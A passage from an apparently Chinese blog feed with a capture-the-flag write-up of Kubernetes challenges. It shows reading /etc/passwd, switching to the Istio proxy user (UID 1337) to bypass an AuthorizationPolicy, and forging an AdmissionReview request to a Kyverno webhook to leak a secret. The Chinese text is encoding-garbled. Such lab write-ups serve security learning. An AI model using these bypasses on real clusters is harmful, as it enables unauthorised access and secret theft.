class="attr">operation:</span></span><br><span class="line">        <span class="attr">methods:</span> [<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;GET&quot;</span>]</span><br></pre></td></tr></table></figure><blockquote><p>æµ…æµ…é—®ä¸€æ³¢ gptï¼šè¿™ä¸ª AuthorizationPolicy å®šä¹‰äº†ä¸€ä¸ªè®¿é—®æ§åˆ¶ç­–ç•¥ï¼Œæ‹’ç»å…·æœ‰ç‰¹å®šæ ‡ç­¾çš„åº”ç”¨ç¨‹åºï¼ˆâ€{flag-pod-name}â€ï¼‰çš„è¯·æ±‚ï¼ŒåŒæ—¶åªå…è®¸æ¥è‡ª k8s-lan-party å‘½åç©ºé—´çš„ POST å’Œ GET è¯·æ±‚è®¿é—®ç›®æ ‡èµ„æºã€‚</p></blockquote><h3 id="è€ƒç‚¹-3"><a href="#è€ƒç‚¹-3" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h3><ul><li>Istio</li><li>IPTables</li><li>PID&#x2F;UID&#x2F;GID</li></ul><h3 id="åˆ†æ-3"><a href="#åˆ†æ-3" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ol><li>æ‰“å¼€é¶åœºç»™çš„ <code>root</code> å¾ˆéš¾ä¸è®©æˆ‘æƒ³åˆ°é€ƒé€¸ã€‚å“ˆå“ˆã€‚</li><li>å…ˆå­¦ä¸€ä¸‹ hint é‡Œé¢çš„ <code>lstio</code> å’Œ<code>iptabl</code></li></ol><h4 id="lstio"><a href="#lstio" class="headerlink" title="lstio"></a>lstio</h4><blockquote><p>å®ƒæ˜¯ä¸€ä¸ªå®Œå…¨å¼€æºçš„æœåŠ¡ç½‘æ ¼ï¼Œä»¥é€æ˜å±‚çš„æ–¹å¼æ„å»ºåœ¨ç°æœ‰åˆ†å¸ƒå¼åº”ç”¨ä¸­ã€‚å®ƒä¹Ÿæ˜¯ä¸€ä¸ªæä¾›äº†å„ç§APIçš„å¹³å°ï¼Œå¯ä»¥ä¸ä»»ä½•æ—¥å¿—å¹³å°ã€ç›‘æ§ç³»ç»Ÿæˆ–ç­–ç•¥ç³»ç»Ÿé›†æˆã€‚Istioçš„å¤šæ ·åŒ–ç‰¹æ€§å¯ä»¥è®©ä½ é«˜æ•ˆåœ°è¿è¡Œåˆ†å¸ƒå¼å¾®æœåŠ¡æ¶æ„ï¼Œå¹¶æä¾›ä¸€ç§ç»Ÿä¸€çš„æ–¹å¼æ¥ä¿æŠ¤ã€è¿æ¥å’Œç›‘æ§å¾®æœåŠ¡</p></blockquote><h4 id="iptabl"><a href="#iptabl" class="headerlink" title="iptabl"></a>iptabl</h4><blockquote><p><code>iptables</code> æ˜¯ Linux å†…æ ¸ä¸­çš„é˜²ç«å¢™è½¯ä»¶ netfilter çš„ç®¡ç†å·¥å…·ï¼Œä½äºç”¨æˆ·ç©ºé—´ï¼ŒåŒæ—¶ä¹Ÿæ˜¯ netfilter çš„ä¸€éƒ¨åˆ†ã€‚Netfilter ä½äºå†…æ ¸ç©ºé—´ï¼Œä¸ä»…æœ‰ç½‘ç»œåœ°å€è½¬æ¢çš„åŠŸèƒ½ï¼Œä¹Ÿå…·å¤‡æ•°æ®åŒ…å†…å®¹ä¿®æ”¹ã€ä»¥åŠæ•°æ®åŒ…è¿‡æ»¤ç­‰é˜²ç«å¢™åŠŸèƒ½ã€‚</p></blockquote><p>iptable ä¸­ä¸€å…±æœ‰äº”å¼ è¡¨ï¼Œåˆ†åˆ«è´Ÿè´£ä¸åŒçš„æ–¹å‘(æ•°æ®åŒ…ã€é˜²ç«å¢™ã€ç½‘ç»œåœ°å€è½¬æ¢ã€æ•°æ®åŒ…ä¿®æ”¹ã€è®¿é—®æ§åˆ¶)ï¼Œä¸åŒåœ°æ–¹è¡¨å…·æœ‰çš„é“¾è·¯(è¾“å…¥è¾“å‡ºç­‰)ä¹Ÿä¸åŒã€‚</p><p>ä»¥ <code>filtter</code> è¡¨ä¸ºä¾‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ iptables -L -v</span><br><span class="line">Chain INPUT (policy ACCEPT 350K packets, 63M bytes)</span><br><span class="line"> pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination</span><br><span class="line">Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)</span><br><span class="line"> pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination</span><br><span class="line">Chain OUTPUT (policy ACCEPT 18M packets, 1916M bytes)</span><br><span class="line"> pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°ä¸‰ä¸ªé»˜è®¤çš„é“¾ï¼Œåˆ†åˆ«æ˜¯ INPUTã€FORWARD å’Œ OUTPUTï¼Œæ¯ä¸ªé“¾ä¸­çš„ç¬¬ä¸€è¡Œè¾“å‡ºè¡¨ç¤ºé“¾åç§°ï¼ˆåœ¨æœ¬ä¾‹ä¸­ä¸º INPUT&#x2F;FORWARD&#x2F;OUTPUTï¼‰ï¼Œåè·Ÿé»˜è®¤ç­–ç•¥ï¼ˆACCEPTï¼‰ã€‚</p><p>æ¯æ¡é“¾ä¸­éƒ½å¯ä»¥æ·»åŠ å¤šæ¡è§„åˆ™ï¼Œè§„åˆ™æ˜¯æŒ‰ç…§é¡ºåºä»å‰åˆ°åæ‰§è¡Œçš„ã€‚çœ‹ä¸‹è§„åˆ™çš„è¡¨å¤´å®šä¹‰ã€‚</p><ul><li><strong>pkts</strong>ï¼šå¤„ç†è¿‡çš„åŒ¹é…çš„æŠ¥æ–‡æ•°é‡</li><li><strong>bytes</strong>ï¼šç´¯è®¡å¤„ç†çš„æŠ¥æ–‡å¤§å°ï¼ˆå­—èŠ‚æ•°ï¼‰</li><li><strong>target</strong>ï¼šå¦‚æœæŠ¥æ–‡ä¸è§„åˆ™åŒ¹é…ï¼ŒæŒ‡å®šç›®æ ‡å°±ä¼šè¢«æ‰§è¡Œã€‚</li><li><strong>prot</strong>ï¼šåè®®ï¼Œä¾‹å¦‚ <code>tdp</code>ã€<code>udp</code>ã€<code>icmp</code> å’Œ <code>all</code>ã€‚</li><li><strong>opt</strong>ï¼šå¾ˆå°‘ä½¿ç”¨ï¼Œè¿™ä¸€åˆ—ç”¨äºæ˜¾ç¤º IP é€‰é¡¹ã€‚</li><li><strong>in</strong>ï¼šå…¥ç«™ç½‘å¡ã€‚</li><li><strong>out</strong>ï¼šå‡ºç«™ç½‘å¡ã€‚</li><li><strong>source</strong>ï¼šæµé‡çš„æº IP åœ°å€æˆ–å­ç½‘ï¼Œæˆ–è€…æ˜¯ <code>anywhere</code>ã€‚</li><li><strong>destination</strong>ï¼šæµé‡çš„ç›®çš„åœ° IP åœ°å€æˆ–å­ç½‘ï¼Œæˆ–è€…æ˜¯ <code>anywhere</code>ã€‚</li></ul><h4 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h4><ul><li>serviceï¼šdnscan æ‰«æ</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">istio-protected-pod-service.k8s-lan-party.svc.cluster.local.</span><br></pre></td></tr></table></figure><p>å‘½åç©ºé—´æ²¡é—®é¢˜ï¼Œé—®é¢˜åœ¨äºè¢«æ‹’ç»äº†ï¼šå…·æœ‰ç‰¹å®šæ ‡ç­¾ <code>&#123;flag-pod-name&#125;</code> çš„åº”ç”¨ç¨‹åºï¼ˆâ€<code>istio-protected-pod-service</code>â€œï¼‰çš„è¯·æ±‚</p><h4 id="hint-åˆ†æ"><a href="#hint-åˆ†æ" class="headerlink" title="hint åˆ†æ"></a>hint åˆ†æ</h4><p>å…³é”®æ¦‚å¿µï¼š<strong>Magic constants</strong></p><p>1337 - uid and gid used to distinguish between traffic originating from proxy vs the applications.</p><p>é‡è¦çš„å°±æ˜¯</p><blockquote><p><strong>Outbound bypass</strong></p><ul><li>If you observe the iptables rules above, you will see a magic number (1337) appear several times. <strong><code>This is the uid/gid of the running proxy which is used by iptables</code></strong> to differentiate between packets originating from the proxy and the ones originating from the application. When packets originate from the application, they must be redirected to proxy to implement a service mesh. When packets originate from the proxy, <strong><code>they \*must not\* be redirected</code></strong> as doing so will cause an infinite loop.</li></ul></blockquote><p>This can cause multiple issues.</p><p>If the cluster is not mTLS, the outbound policies could be bypassed such as <code>Data leak prevention</code></p><h4 id="éªŒè¯"><a href="#éªŒè¯" class="headerlink" title="éªŒè¯"></a>éªŒè¯</h4><p>æŸ¥çœ‹ UID</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@wiz-k8s-lan-party:~<span class="comment"># cat /etc/passwd</span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">messagebus:x:101:101::/nonexistent:/usr/sbin/nologin</span><br><span class="line">_rpc:x:102:65534::/run/rpcbind:/usr/sbin/nologin</span><br><span class="line">statd:x:103:65534::/var/lib/nfs:/usr/sbin/nologin</span><br><span class="line">istio:x:1337:1337::/home/istio:/bin/sh</span><br><span class="line">player:x:1001:1001::/home/player:/bin/sh</span><br></pre></td></tr></table></figure><p>å‘ç°äº®ç‚¹ï¼š<code>istio:x:1337:1337::/home/istio:/bin/sh</code>  ï¼Œroot(ä¹Ÿå°±æ˜¯å½“å‰ç”¨æˆ·)UIDå’ŒGIDä¸º <code>1337</code></p><p>æ ¹æ®ï¼š<a href="https://github.com/istio/istio/issues/4286">https://github.com/istio/istio/issues/4286</a></p><p>æˆ‘ä»¬ç›´æ¥åˆ‡è¿™ä¸ªç”¨æˆ·ç„¶åå°±å¯ä»¥ç»•è¿‡ <code>deny</code> äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@wiz-k8s-lan-party:~<span class="comment"># su istio</span></span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line">uid=1337(istio) gid=1337(istio) <span class="built_in">groups</span>=1337(istio)</span><br><span class="line">$ curl istio-protected-pod-service.k8s-lan-party.svc.cluster.local</span><br><span class="line">wiz_k8s_lan_party&#123;only-leet-hex0rs-can-play-both-k8s-and-linux&#125;$ </span><br></pre></td></tr></table></figure><h2 id="challenge-5ï¼šLATERAL-MOVEMENT"><a href="#challenge-5ï¼šLATERAL-MOVEMENT" class="headerlink" title="challenge 5ï¼šLATERAL MOVEMENT"></a>challenge 5ï¼šLATERAL MOVEMENT</h2><h3 id="é¢˜ç›®æè¿°-4"><a href="#é¢˜ç›®æè¿°-4" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><h4 id="Who-will-guard-the-guardians"><a href="#Who-will-guard-the-guardians" class="headerlink" title="Who will guard the guardians?"></a><strong>Who will guard the guardians?</strong></h4><blockquote><p>Where pods are being mutated by a foreign regime, one could abuse its bureaucracy and leak sensitive information from the <a href="https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/#request">administrative</a> services.</p></blockquote><h4 id="Hint"><a href="#Hint" class="headerlink" title="Hint"></a><strong>Hint</strong></h4><blockquote><p>Need a hand crafting AdmissionReview requests? Checkout  <a href="https://github.com/anderseknert/kube-review">https://github.com/anderseknert/kube-review</a>.</p></blockquote><h4 id="Policy"><a href="#Policy" class="headerlink" title="Policy"></a>Policy</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">kyverno.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Policy</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">apply-flag-to-env</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">sensitive-ns</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">rules:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">inject-env-vars</span></span><br><span class="line">      <span class="attr">match:</span></span><br><span class="line">        <span class="attr">resources:</span></span><br><span class="line">          <span class="attr">kinds:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Pod</span></span><br><span class="line">      <span class="attr">mutate:</span></span><br><span class="line">        <span class="attr">patchStrategicMerge:</span></span><br><span class="line">          <span class="attr">spec:</span></span><br><span class="line">            <span class="attr">containers:</span></span><br><span class="line">              <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">                <span class="attr">env:</span></span><br><span class="line">                  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">FLAG</span></span><br><span class="line">                    <span class="attr">value:</span> <span class="string">&quot;&#123;flag&#125;&quot;</span></span><br></pre></td></tr></table></figure><h2 id="è€ƒç‚¹-4"><a href="#è€ƒç‚¹-4" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h2><ul><li>Dynamic Admission Control<ul><li><strong>admission webhooks</strong></li><li>AdmissionReview</li></ul></li></ul><h3 id="åˆ†æ-4"><a href="#åˆ†æ-4" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ol><li>å­¦ä¹ é¢˜ç›®æè¿°å’Œ hint</li></ol><p><strong><a href="https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/#request">Webhook request and response</a></strong></p><ul><li>webhooks can specify what versions of <code>AdmissionReview</code> objects they accept with the <code>admissionReviewVersions</code> field in their configuration</li></ul><p>å°±æ˜¯ä¸€å¥—è¯·æ±‚å“åº”ä½“ç³»ã€‚ä¸èƒ½ç›´æ¥å‘è¯·æ±‚ï¼Œéœ€è¦åŠ ä¸Š JSON æ„é€ ä¸€ä¸ªåˆæ³•è¯·æ±‚ã€‚</p><blockquote><p>When allowing a request, a mutating admission webhook may optionally modify the incoming object as well. This is done using the<code>patch</code> and<code>patchType</code> fields in the response. The only currently supported <code>patchType</code> is <code>JSONPatch</code>.For <code>patchType: JSONPatch</code>, the <code>patch</code>  field contains a base64-encoded array of JSON patch operations.</p></blockquote><ol><li>ä¿¡æ¯æœé›†</li></ol><p><strong>Service</strong>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kyverno-cleanup-controller.kyverno.svc.cluster.local.</span><br><span class="line">player@wiz-k8s-lan-party:~$ dnscan -subnet 10.100.0.1/16</span><br><span class="line">10.100.126.98 -&gt; kyverno-svc-metrics.kyverno.svc.cluster.local.</span><br><span class="line">10.100.158.213 -&gt; kyverno-reports-controller-metrics.kyverno.svc.cluster.local.</span><br><span class="line">10.100.171.174 -&gt; kyverno-background-controller-metrics.kyverno.svc.cluster.local.</span><br><span class="line">10.100.217.223 -&gt; kyverno-cleanup-controller-metrics.kyverno.svc.cluster.local.</span><br><span class="line">10.100.232.19 -&gt; kyverno-svc.kyverno.svc.cluster.local.</span><br></pre></td></tr></table></figure><p>æ²¡æ‡‚å•¥æ„æ€ï¼Œä½†æ˜¯å°±æ˜¯ç›´æ¥è¯·æ±‚ç»™çš„<code>policy</code> è½¬æ¢çš„JSONï¼Œç„¶åå°±è¿”å›patchäº†ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:~$ curl -k -X POST &lt;https://kyverno-svc.kyverno.svc.cluster.local&gt;./mutate -H <span class="string">&quot;Content-Type: application/json&quot;</span> --data <span class="string">&#x27;&#123;&quot;apiVersion&quot;:&quot;admission.k8s.io/v1&quot;,&quot;kind&quot;:&quot;AdmissionReview&quot;,&quot;request&quot;:&#123;&quot;uid&quot;:&quot;2024ee9c-c374-413c-838d-e62bcb4826be&quot;,&quot;kind&quot;:&#123;&quot;group&quot;:&quot;&quot;,&quot;version&quot;:&quot;v1&quot;,&quot;kind&quot;:&quot;Pod&quot;&#125;,&quot;resource&quot;:&#123;&quot;group&quot;:&quot;&quot;,&quot;version&quot;:&quot;v1&quot;,&quot;resource&quot;:&quot;pods&quot;&#125;,&quot;requestKind&quot;:&#123;&quot;group&quot;:&quot;&quot;,&quot;version&quot;:&quot;v1&quot;,&quot;kind&quot;:&quot;Pod&quot;&#125;,&quot;requestResource&quot;:&#123;&quot;group&quot;:&quot;&quot;,&quot;version&quot;:&quot;v1&quot;,&quot;resource&quot;:&quot;pods&quot;&#125;,&quot;name&quot;:&quot;example-pod&quot;,&quot;namespace&quot;:&quot;sensitive-ns&quot;,&quot;operation&quot;:&quot;CREATE&quot;,&quot;userInfo&quot;:&#123;&quot;username&quot;:&quot;psych&quot;,&quot;uid&quot;:&quot;xxx&quot;,&quot;groups&quot;:[&quot;system:authenticated&quot;]&#125;,&quot;object&quot;:&#123;&quot;apiVersion&quot;:&quot;v1&quot;,&quot;kind&quot;:&quot;Pod&quot;,&quot;metadata&quot;:&#123;&quot;name&quot;:&quot;psych-pod&quot;,&quot;namespace&quot;:&quot;sensitive-ns&quot;&#125;,&quot;spec&quot;:&#123;&quot;containers&quot;:[&#123;&quot;name&quot;:&quot;psych-container&quot;,&quot;image&quot;:&quot;nginx&quot;,&quot;env&quot;:[&#123;&quot;name&quot;:&quot;FLAG&quot;,&quot;value&quot;:&quot;&#123;flag&#125;&quot;&#125;]&#125;]&#125;&#125;,&quot;oldObject&quot;:null,&quot;options&quot;:&#123;&quot;apiVersion&quot;:&quot;meta.k8s.io/v1&quot;,&quot;kind&quot;:&quot;CreateOptions&quot;&#125;,&quot;dryRun&quot;:true&#125;&#125;&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;kind&quot;</span>:<span class="string">&quot;AdmissionReview&quot;</span>,<span class="string">&quot;apiVersion&quot;</span>:<span class="string">&quot;admission.k8s.io/v1&quot;</span>,<span class="string">&quot;request&quot;</span>:&#123;<span class="string">&quot;uid&quot;</span>:<span class="string">&quot;2024ee9c-c374-413c-838d-e62bcb4826be&quot;</span>,<span class="string">&quot;kind&quot;</span>:&#123;<span class="string">&quot;group&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;version&quot;</span>:<span class="string">&quot;v1&quot;</span>,<span class="string">&quot;kind&quot;</span>:<span class="string">&quot;Pod&quot;</span>&#125;,<span class="string">&quot;resource&quot;</span>:&#123;<span class="string">&quot;group&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;version&quot;</span>:<span class="string">&quot;v1&quot;</span>,<span class="string">&quot;resource&quot;</span>:<span class="string">&quot;pods&quot;</span>&#125;,<span class="string">&quot;requestKind&quot;</span>:&#123;<span class="string">&quot;group&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;version&quot;</span>:<span class="string">&quot;v1&quot;</span>,<span class="string">&quot;kind&quot;</span>:<span class="string">&quot;Pod&quot;</span>&#125;,<span class="string">&quot;requestResource&quot;</span>:&#123;<span class="string">&quot;group&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;version&quot;</span>:<span class="string">&quot;v1&quot;</span>,<span class="string">&quot;resource&quot;</span>:<span class="string">&quot;pods&quot;</span>&#125;,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;example-pod&quot;</span>,<span class="string">&quot;namespace&quot;</span>:<span class="string">&quot;sensitive-ns&quot;</span>,<span class="string">&quot;operation&quot;</span>:<span class="string">&quot;CREATE&quot;</span>,<span class="string">&quot;userInfo&quot;</span>:&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;psych&quot;</span>,<span class="string">&quot;uid&quot;</span>:<span class="string">&quot;xxx&quot;</span>,<span class="string">&quot;groups&quot;</span>:[<span class="string">&quot;system:authenticated&quot;</span>]&#125;,<span class="string">&quot;object&quot;</span>:&#123;<span class="string">&quot;apiVersion&quot;</span>:<span class="string">&quot;v1&quot;</span>,<span class="string">&quot;kind&quot;</span>:<span class="string">&quot;Pod&quot;</span>,<span class="string">&quot;metadata&quot;</span>:&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;psych-pod&quot;</span>,<span class="string">&quot;namespace&quot;</span>:<span class="string">&quot;sensitive-ns&quot;</span>&#125;,<span class="string">&quot;spec&quot;</span>:&#123;<span class="string">&quot;containers&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;psych-container&quot;</span>,<span class="string">&quot;image&quot;</span>:<span class="string">&quot;nginx&quot;</span>,<span class="string">&quot;env&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;FLAG&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;&#123;flag&#125;&quot;</span>&#125;]&#125;]&#125;&#125;,<span class="string">&quot;oldObject&quot;</span>:null,<span class="string">&quot;dryRun&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;options&quot;</span>:&#123;<span class="string">&quot;apiVersion&quot;</span>:<span class="string">&quot;meta.k8s.io/v1&quot;</span>,<span class="string">&quot;kind&quot;</span>:<span class="string">&quot;CreateOptions&quot;</span>&#125;&#125;,<span class="string">&quot;response&quot;</span>:&#123;<span class="string">&quot;uid&quot;</span>:<span class="string">&quot;2024ee9c-c374-413c-838d-e62bcb4826be&quot;</span>,<span class="string">&quot;allowed&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;patch&quot;</span>:<span class="string">&quot;W3sib3AiOiJyZXBsYWNlIiwicGF0aCI6Ii9zcGVjL2NvbnRhaW5lcnMvMC9lbnYvMC92YWx1ZSIsInZhbHVlIjoid2l6X2s4c19sYW5fcGFydHl7eW91LWFyZS1rOHMtbmV0LW1hc3Rlci13aXRoLWdyZWF0LXBvd2VyLXRvLW11dGF0ZS15b3VyLXdheS10by12aWN0b3J5fSJ9LCB7InBhdGgiOiIvbWV0YWRhdGEvYW5ub3RhdGlvbnMiLCJvcCI6ImFkZCIsInZhbHVlIjp7InBvbGljaWVzLmt5dmVybm8uaW8vbGFzdC1hcHBsaWVkLXBhdGNoZXMiOiJpbmplY3QtZW52LXZhcnMuYXBwbHktZmxhZy10by1lbnYua3l2ZXJuby5pbzogcmVwbGFjZWQgL3NwZWMvY29udGFpbmVycy8wL2Vudi8wL3ZhbHVlXG4ifX1d&quot;</span>,<span class="string">&quot;patchType&quot;</span>:<span class="string">&quot;JSONPatch&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p><code>W3sib3AiOiJyZXBsYWNlIiwicGF0aCI6Ii9zcGVjL2NvbnRhaW5lcnMvMC9lbnYvMC92YWx1ZSIsInZhbHVlIjoid2l6X2s4c19sYW5fcGFydHl7eW91LWFyZS1rOHMtbmV0LW1hc3Rlci13aXRoLWdyZWF0LXBvd2VyLXRvLW11dGF0ZS15b3VyLXdheS10by12aWN0b3J5fSJ9LCB7InBhdGgiOiIvbWV0YWRhdGEvYW5ub3RhdGlvbnMiLCJvcCI6ImFkZCIsInZhbHVlIjp7InBvbGljaWVzLmt5dmVybm8uaW8vbGFzdC1hcHBsaWVkLXBhdGNoZXMiOiJpbmplY3QtZW52LXZhcnMuYXBwbHktZmxhZy10by1lbnYua3l2ZXJuby5pbzogcmVwbGFjZWQgL3NwZWMvY29udGFpbmVycy8wL2Vudi8wL3ZhbHVlXG4ifX1d</code> base64decode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;op&quot;:&quot;replace&quot;,&quot;path&quot;:&quot;/spec/containers/0/env/0/value&quot;,&quot;value&quot;:&quot;wiz_k8s_lan_party&#123;you-are-k8s-net-master-with-great-power-to-mutate-your-way-to-victory&#125;&quot;&#125;, &#123;&quot;path&quot;:&quot;/metadata/annotations&quot;,&quot;op&quot;:&quot;add&quot;,&quot;value&quot;:&#123;&quot;[policies.kyverno.io/last-applied-patches&quot;:&quot;inject-env-vars.apply-flag-to-env.kyverno.io:](&lt;http://policies.kyverno.io/last-applied-patches%22:%22inject-env-vars.apply-flag-to-env.kyverno.io:&gt;) replaced /spec/containers/0/env/0/value\\n&quot;&#125;&#125;]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> äº‘åŸç”Ÿ </category>
          
          <category> å®¹å™¨å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> k8s </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ˜“å­¦å¯¼è¨€åŠå¥‡é—¨éç”²å…¥é—¨</title>
      <link href="/2024/03/22/%E6%98%93%E5%AD%A6%E5%AF%BC%E8%A8%80%E5%8F%8A%E5%A5%87%E9%97%A8%E9%81%81%E7%94%B2%E5%85%A5%E9%97%A8/"/>
      <url>/2024/03/22/%E6%98%93%E5%AD%A6%E5%AF%BC%E8%A8%80%E5%8F%8A%E5%A5%87%E9%97%A8%E9%81%81%E7%94%B2%E5%85%A5%E9%97%A8/</url>
      
